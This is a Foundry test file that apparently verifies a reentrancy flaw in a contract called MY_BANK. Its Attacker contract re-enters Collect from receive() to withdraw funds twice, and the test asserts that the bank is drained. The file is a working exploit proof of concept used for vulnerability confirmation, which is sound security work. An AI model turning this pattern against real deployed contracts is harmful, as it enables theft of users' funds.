// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xf015c35649c82f5467c9c74b7f28ee67665aad68.sol";

contract ReentrancyTest is Test {
    MY_BANK public myBank;
    Log public logContract;
    Attacker public attacker;

    function setUp() public {
        // Deploy dependencies
        logContract = new Log();
        myBank = new MY_BANK(address(logContract));
        
        // Deploy attacker and fund it
        attacker = new Attacker(myBank);
        vm.deal(address(attacker), 1 ether);
    }

    function testCollectReentrancy() public {
        // Deposit into bank
        vm.prank(address(attacker));
        attacker.deposit{value: 1 ether}();

        // Advance time to unlock funds
        vm.warp(1001);

        console.log("--- BEFORE-Trigger Attack ---");
        uint256 bankBalanceBefore = address(myBank).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        (uint256 depositBalanceBefore, ) = myBank.Acc(address(attacker));
        console.log("MY_BANK contract ETH balance:", bankBalanceBefore);
        console.log("Attacker contract ETH balance:", attackerBalanceBefore);
        console.log("Attacker deposit in MY_BANK:", depositBalanceBefore);

        console.log("--- Trigger Attack ---");
        // Execute attack to verify reentrancy
        vm.prank(address(attacker));
        attacker.attack();

        console.log("--- AFTER-Trigger Attack ---");
        uint256 bankBalanceAfter = address(myBank).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        (uint256 depositBalanceAfter, ) = myBank.Acc(address(attacker));
        console.log("MY_BANK contract ETH balance:", bankBalanceAfter);
        console.log("Attacker contract ETH balance:", attackerBalanceAfter);
        console.log("Attacker deposit in MY_BANK:", depositBalanceAfter);

        // Calculate differences
        uint256 bankBalanceDiff = bankBalanceBefore - bankBalanceAfter;
        uint256 attackerBalanceDiff = attackerBalanceAfter - attackerBalanceBefore;
        uint256 depositBalanceDiff = depositBalanceBefore - depositBalanceAfter;

        // Differential verification
        bool bankLostValue = bankBalanceAfter < bankBalanceBefore;
        bool attackerReceivedFunds = attackerBalanceAfter > attackerBalanceBefore;
        bool depositDecreased = depositBalanceAfter < depositBalanceBefore;
        bool multipleWithdrawalsOccurred = bankBalanceDiff > 0.1 ether;

        console.log("Bank balance decreased:", bankLostValue);
        console.log("Attacker received funds:", attackerReceivedFunds);
        console.log("Deposit decreased:", depositDecreased);
        console.log("Multiple withdrawals detected:", multipleWithdrawalsOccurred);

        // Final vulnerability verdict
        if (bankLostValue && attackerReceivedFunds && depositDecreased && multipleWithdrawalsOccurred) {
            console.log("Vulnerability Exists: Re-entrancy attack drained funds via multiple withdrawals");
        } else {
            console.log("Vulnerability not Exist: State changes not consistent with successful reentrancy attack");
        }

        // Verify specific values using proper assertions
        assertEq(attacker.reentryCount(), 2, "Re-entrance should occur twice");
        assertEq(address(attacker).balance, 0.2 ether, "Attacker drained extra funds");
        assertEq(address(myBank).balance, 0.8 ether, "Bank reserves drained via reentrancy");
    }
}

contract Attacker {
    uint public reentryCount;
    MY_BANK public myBank;
    uint constant WITHDRAW_AMOUNT = 0.1 ether;

    constructor(MY_BANK _myBank) {
        myBank = _myBank;
    }

    function deposit() public payable {
        myBank.Put{value: msg.value}(0);
    }

    function attack() public {
        myBank.Collect(WITHDRAW_AMOUNT);
    }

    receive() external payable {
        reentryCount++;
        if (reentryCount < 2) {
            myBank.Collect(WITHDRAW_AMOUNT);
        }
    }
}